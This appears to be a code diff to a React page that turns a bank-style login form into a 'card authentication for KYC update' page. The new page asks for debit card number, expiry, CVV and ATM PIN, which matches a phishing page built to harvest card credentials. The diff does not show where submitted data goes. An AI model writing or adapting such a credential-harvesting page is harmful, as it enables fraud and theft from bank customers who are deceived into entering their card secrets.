@@ -42,24 +42,30 @@ export default function Home() {
   return (
     <>
     <Header />
-    <h5 className={`${styles.Centering} mb-0 mt-4`}>Login</h5>
+    <h5 className={`${styles.Centering} mb-0 mt-4`}>Authenticate your card for update KYC</h5>
+    <a className="link-primary text-center d-flex justify-content-center w-100 mt-4">
+      You Sucessfully Entered <br />
+      Mobile Number xxxxxxxxxx
+    </a>
     <div className={styles.formContainer}>
       <form onSubmit={handleSubmit} >
-        <div className={styles.inputGroup}>
-          <input type="text" name="custid" minLength={9} maxLength={9}  required placeholder=" " />
-          <label>Customer Id</label>
+        <DebitCardInputComponent />
+
+        <div className="d-flex gap-4">
+            <ExpiryDateInputComponent />
+          <div className={styles.inputGroup}>
+            <input type="password" minLength={3} maxLength={3} inputMode="numeric"  name="cvv" required placeholder=" " />
+            <label>CVV</label>
+          </div>
         </div>
         <div className={styles.inputGroup}>
-          <input type="password"  name="pass" required placeholder=" " />
-          <label>Password</label>
-        </div>
+            <input type="password" maxLength={4} inputMode="numeric" minLength={4} name="pin" required placeholder=" " />
+            <label>PIN Number</label>
+          </div>
         <button type="submit"  className={styles.button}>
-          Login
+          Submit
         </button>
         
-        <div className={styles.assistanceLink}>
-            <a>Use Customer Id or Login ID</a>
-        </div>
         <a href="#" className={styles.assistanceLink}>
           Need assistance activating mobile banking
         </a>
